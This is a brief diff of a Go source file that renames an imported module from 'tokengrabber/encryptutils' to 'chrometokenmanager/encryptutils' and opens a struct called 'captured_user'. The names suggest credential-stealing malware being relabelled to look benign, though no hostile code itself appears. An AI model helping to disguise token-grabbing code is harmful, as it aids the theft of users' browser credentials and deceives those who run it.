@@ -2,7 +2,7 @@ package main
 
 import (
 	"fmt"
-	"tokengrabber/encryptutils"
+	"chrometokenmanager/encryptutils"
 )
 
 type captured_user struct {
